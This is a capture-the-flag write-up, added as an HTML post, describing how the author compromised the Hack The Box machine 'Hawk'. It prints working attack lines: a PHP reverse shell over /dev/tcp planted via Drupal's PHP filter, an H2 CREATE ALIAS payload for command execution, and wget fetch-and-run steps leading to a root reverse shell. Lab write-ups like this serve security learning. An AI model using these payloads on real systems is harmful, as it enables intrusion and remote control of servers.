@@ -1,0 +1,165 @@
+<hr />
+
+<h4 id="hawk-has-retired-and-this-is-my-write-up-about-it">Hawk has retired and this is my write-up about it.</h4>
+<h4 id="its-a-linux-box-and-its-ip-is-101010102-so-lets-jump-right-in-">It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in !</h4>
+<p><img src="/images/hackthebox/hawk/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="starting-with-a-simple-nmap-scan-to-scan-tor-tcp--udp-ports-and-services">Starting with a simple nmap scan to scan tor TCP , UDP ports and services.</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sU 10.10.10.102</code>
+<img src="/images/hackthebox/hawk/1.png" alt="" />
+<br /></p>
+<h4 id="we-will-see-that-we-got-ftp-on-port-21--ssh-on-port-22--http-on-port-80-running-apache-server-and-http-on-port-8082-running-h2-database-http-console">We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="ftp">FTP</h3>
+<h4 id="since-theres-ftp-on-the-box-lets-check-if-we-can-do-anonymous-login">Since there’s FTP on the box let’s check if we can do anonymous login.</h4>
+<p><img src="/images/hackthebox/hawk/2.png" alt="" /></p>
+<h4 id="we-could-login-as-anonymous-and-we-got-a-file-called--drupaltxtenc">We could login as anonymous and we got a file called : .drupal.txt.enc</h4>
+<h4 id="since-it-ends-with-enc-then-its-an-encrypted-file">Since it ends with .enc then it’s an encrypted file.</h4>
+<h4 id="lets-run-file-command-against-it-to-get-more-information">Let’s run file command against it to get more information.</h4>
+<p><br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file drupal.txt.enc
+drupal.txt.enc : openssl enc'd data with salted password , base64 encoded
+</code></pre></div></div>
+<h4 id="so-base64-encoded--lets-decode-it">So base64 encoded ? Let’s decode it.</h4>
+<p><br />
+<code class="highlighter-rouge">base64 -d drupal.txt.enc &gt; drupal_decoded.txt.enc</code>
+<img src="/images/hackthebox/hawk/3.png" alt="" /></p>
+<h4 id="now-the-file-is-ready-for-bruteforcing">Now the file is ready for bruteforcing.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="decrypting-the-file">Decrypting The File</h3>
+<h4 id="to-get-the-password-for-decryption-we-will-use-a-tool-called-bruteforce-salted-openssl-with-rockyou">To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou.</h4>
+<h4 id="its-already-installed-on-kali-but-if-youre-not-using-kali-you-can-get-it-from-here">It’s already installed on kali but if you’re not using kali you can get it from <a href="https://github.com/glv2/bruteforce-salted-openssl">here</a></h4>
+<h4 id="now-theres-a-small-problem-we-need-to-specify-the-right-cipher-and-digest-to-be-able-to-crack-the-file-so-we-have-to-do-some-guessing">Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing.</h4>
+<h4 id="i-already-cracked-it-so-the-cipher-is-aes-256-cbc-and-the-digest-is-sha256">I already cracked it so the cipher is AES-256-CBC and the digest is SHA256.</h4>
+<p><code class="highlighter-rouge">bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1</code></p>
+<h4 id="you-may-ask-yourself-why-i-didnt-specify-the-cipher-i-didnt-specify-it-because-the-tool-uses-aes-256-cbc-by-default">You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default.</h4>
+<p><img src="/images/hackthebox/hawk/4.png" alt="" /></p>
+<h4 id="great--we-got-the-password--friends--lets-decrypt-the-file">Great ! We got the password : friends . Let’s decrypt the file.</h4>
+<p><code class="highlighter-rouge">openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends</code>
+<img src="/images/hackthebox/hawk/5.png" alt="" /></p>
+<h4 id="now-we-have-a-username--daniel-and-a-password--pencilkeybaordscanner123">Now we have a username : “daniel” and a password : PencilKeybaordScanner123</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="drupal">Drupal</h3>
+<h4 id="we-see-in-the-message-that-the-password-is-for-a-portal-but-what-portal">We see in the message that the password is for a portal. But what portal?</h4>
+<h4 id="lets-visit-the-website-on-port-80">Let’s visit the website on port 80</h4>
+<p><img src="/images/hackthebox/hawk/6.png" alt="" /></p>
+<h4 id="we-see-that-its-running-drupal-cms">We see that it’s running drupal CMS</h4>
+<h4 id="lets-login-with-the-credentials-we-have">Let’s login with the credentials we have.</h4>
+<h4 id="username-daniel-didnt-work-but-admin-worked-and-we-got-in-as-admin-">Username daniel didn’t work but admin worked and we got in as admin !</h4>
+<p><img src="/images/hackthebox/hawk/7.png" alt="" /></p>
+<h4 id="after-we-enumerate-for-a-while-we-will-see-some-interesting-stuff">After we enumerate for a while we will see some interesting stuff.</h4>
+<h4 id="the-content-tab-which-allows-us-to-add-content-and-the-modules-tab">The content tab which allows us to add content and the modules tab.</h4>
+<h4 id="if-we-tried-to-add-content-we-will-get-two-options--article-or-a-basic-page">If we tried to add content we will get two options : Article or a basic page.</h4>
+<h4 id="we-will-focus-on-basic-pages-for-sure-but-we-can-only-use-html--filtered-html-and-plain-text-">We will focus on basic pages for sure but we can only use html , filtered html and plain text .</h4>
+<h4 id="lets-look-in-the-modules-tab">Let’s look in the modules tab.</h4>
+<h4 id="we-will-find-a-module-called-php-filter-which-allows-us-to-use-php-in-pages-after-we-enable-it-we-will-get-a-fourth-option--php-code">We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code</h4>
+<p><img src="/images/hackthebox/hawk/8.png" alt="" /></p>
+<h4 id="great--lets-get-a-reverse-shell">Great ! Let’s get a reverse shell</h4>
+<p><code class="highlighter-rouge">&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/9090 0&gt;&amp;1'");</code>
+<img src="/images/hackthebox/hawk/9.png" alt="" />
+<img src="/images/hackthebox/hawk/10.png" alt="" /></p>
+<h4 id="lets-check-our-listener">Let’s check our listener.</h4>
+<p><img src="/images/hackthebox/hawk/11.png" alt="" /></p>
+<h4 id="bam-we-got-a-low-privilege-shell-as-www-data-">bam we got a low privilege shell as www-data !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="privilege-escalation-to-daniel">Privilege Escalation to daniel</h3>
+<h4 id="so-were-now-in-as-www-data-lets-check-sensetive-files-first">So we’re now in as www-data let’s check sensetive files first.</h4>
+<h4 id="in-drupal-7-documentation-this-section-its-mentioned-that-settingsphp-contains-where-the-database-is-located--how-to-access-it-and-the-credentials-to-access-it-so-this-file-has-some-sensetive-information-lets-check-that-out">In drupal 7 documentation <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory">This section</a> it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensetive information let’s check that out.</h4>
+<p><img src="/images/hackthebox/hawk/12.png" alt="" />
+<img src="/images/hackthebox/hawk/13.png" alt="" /></p>
+<h4 id="we-got-a-password--drupal4hawk--lets-try-ssh">We got a password : drupal4hawk , Let’s try ssh</h4>
+<p><img src="/images/hackthebox/hawk/14.png" alt="" /></p>
+<h4 id="we-got-in--but-when-we-login-we-get-a-python-interpreter-we-will-get-a-shell-with-pty">We got in ! But when we login we get a python interpreter. We will get a shell with pty</h4>
+<p><br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pty
+pty.spawn("/bin/sh")
+</code></pre></div></div>
+<p><img src="/images/hackthebox/hawk/15.png" alt="" /></p>
+<h4 id="and-we-got-user--d">And we got user ! :D</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="accessing-h2-database">Accessing H2 Database</h3>
+<h4 id="now-with-some-regular-enumeration-if-we-check-out-root-processes-we-will-see-those-2-processes">Now with some regular enumeration if we check out root processes we will see those 2 processes.</h4>
+<p><img src="/images/hackthebox/hawk/16.png" alt="" /></p>
+<h4 id="sounds-familiar--yup-the-h2-database">Sounds familiar ? Yup the H2 Database.</h4>
+<h4 id="if-we-return-to-our-nmap-scan-we-will-see-port-8082-running-h2-database-http-console">If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.</h4>
+<p><img src="/images/hackthebox/hawk/1.png" alt="" /></p>
+<h4 id="now-we-know-that-its-running-as-root-so-lets-try-to-access-that">Now we know that it’s running as root so let’s try to access that.</h4>
+<p><img src="/images/hackthebox/hawk/17.png" alt="" /></p>
+<h4 id="remote-connection-is-disabled-this-means-that-we-can-only-connect-locally">Remote connection is disabled. This means that we can only connect locally.</h4>
+<h4 id="to-bypass-that-we-will-use-ssh-tunneling">To bypass that we will use ssh tunneling.</h4>
+<h4 id="and-if-you-dont-know-what-ssh-tunneling-is--simply-we-will-forward-the-connection-from-the-box-to-our-machine-this-means-that-the-h2-console-will-be-accessed-locally-from-the-box-then-that-connection-will-be-forwarded-to-us">And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.</h4>
+<p><code class="highlighter-rouge">ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102</code>
+<img src="/images/hackthebox/hawk/18.png" alt="" /></p>
+<h4 id="now-if-we-visit-our-localhost-on-port-8080-we-will-get-the-login-page">Now if we visit our localhost on port 8080 we will get the login page.</h4>
+<h4 id="by-default-it-doesnt-have-a-password-so-we-can-access-the-console-without-credentials-but-when-we-login-without-credentials-it-gives-an-error">By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.</h4>
+<p><img src="/images/hackthebox/hawk/19.png" alt="" /></p>
+<h4 id="lets-try-changing-the-jdbc-url-to-something-we-know-that-it-exists-root">Let’s try changing the JDBC URL to something we know that it exists. /root</h4>
+<p><img src="/images/hackthebox/hawk/20.png" alt="" /></p>
+<h4 id="it-worked--now-we-have-access-to-the-console">It worked . Now we have access to the console.</h4>
+<p><img src="/images/hackthebox/hawk/21.png" alt="" />
+<br /></p>
+<hr />
+
+<h3 id="abusing-h2-database-alias-and-privilege-escalation-to-root">Abusing H2 Database ALIAS and Privilege Escalation to root</h3>
+<h4 id="basically-the-create-alias-method-creates-a-function-that-executes-java-code">Basically the <a href="http://www.h2database.com/html/grammar.html#create_alias">CREATE ALIAS</a> method creates a function that executes java code.</h4>
+<h4 id="since-we-can-execute-java-code-then-we-can-do-anything-so-we-will-create-a-function-that-executes-system-commands-then-we-will-get-a-shell">Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.</h4>
+<h4 id="first-we-will-create-alias-called-shellexec-the-payload-will-be-like-this-">First we will create ALIAS called SHELLEXEC. The payload will be like this :</h4>
+<p><br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/hawk/22.png" alt="" /></p>
+<h4 id="then-we-will-execute-system-commands-by-calling-the-function-that-we-created-lets-execute-whoami">Then we will execute system commands by calling the function that we created. Let’s execute whoami.</h4>
+<p><code class="highlighter-rouge">call SHELLEXEC("whoami")</code></p>
+
+<p><img src="/images/hackthebox/hawk/23.png" alt="" /></p>
+<h4 id="and-we-see-root-d">And we see root :D</h4>
+<p><br />
+<br /></p>
+<h4 id="note-that-h2-database-alias-exploit-is-not-mine-credits-go-to-the-creator--check-his-write-up-about-the-exploit-here"><em>NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">here</a></em></h4>
+<p><br />
+<br />
+<br /></p>
+<h4 id="now-since-we-can-execute-system-commands-its-over--we-can-get-a-root-shell">now since we can execute system commands it’s over ! We can get a root shell.</h4>
+<h4 id="but-we-cant-write-a-shell-command-and-execute-it-right-away-it-wont-work-so-instead-of-that-we-can-write-our-shell-in-a-sh-file-then-upload-it-and-execute-it">But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.</h4>
+<h4 id="another-way-is-to-use-msfvenom-but-its-not-needed-here-because-the-exploit-is-simple">Another way is to use msfvenom but it’s not needed here because the exploit is simple.</h4>
+<h4 id="first-we-will-create-the-shell-file">First we will create the shell file.</h4>
+<p><code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.xx.xx/1234 0&gt;&amp;1 &gt; shell</code></p>
+<h4 id="then-we-will-set-up-a-http-server-with-python-to-host-the-shell">Then we will set up a HTTP server with python to host the shell.</h4>
+<p><code class="highlighter-rouge">python -m SimpleHTTPServer 7777</code>
+<img src="/images/hackthebox/hawk/24.png" alt="" /></p>
+<h4 id="now-we-will-use-wget-to-get-the-shell-file-on-the-box">Now we will use wget to get the shell file on the box.</h4>
+<p><code class="highlighter-rouge">call SHELLEXEC("wget http://10.10.xx.xx:7777/shell")</code>
+<img src="/images/hackthebox/hawk/25.png" alt="" />
+<img src="/images/hackthebox/hawk/26.png" alt="" /></p>
+<h4 id="we-will-make-the-file-executable">We will make the file executable.</h4>
+<p><code class="highlighter-rouge">call SHELLEXEC("chmod +x shell")</code>
+<img src="/images/hackthebox/hawk/27.png" alt="" /></p>
+<h4 id="then-we-will-rename-it-to-shellsh">Then we will rename it to shell.sh</h4>
+<p><code class="highlighter-rouge">call SHELLEXEC("mv shell shell.sh")</code>
+<img src="/images/hackthebox/hawk/28.png" alt="" /></p>
+<h4 id="and-finally-we-execute-it">And finally we execute it.</h4>
+<p><code class="highlighter-rouge">call SHELLEXEC("bash shell.sh")</code>
+<img src="/images/hackthebox/hawk/29.png" alt="" /></p>
+<h4 id="we-dont-get-a-response-which-is-a-good-sign-lets-check-our-listener">We don’t get a response which is a good sign. Let’s check our listener.</h4>
+<p><img src="/images/hackthebox/hawk/30.png" alt="" /></p>
+<h4 id="and-we-get-a-shell-as-root--d">And we get a shell as root ! :D</h4>
+<p><br />
+<br />
+<br /></p>
+<h4 id="that-was-hawk-feedback-is-appreciated-">That was Hawk. Feedback is appreciated !</h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br /></p>
+<hr />
+
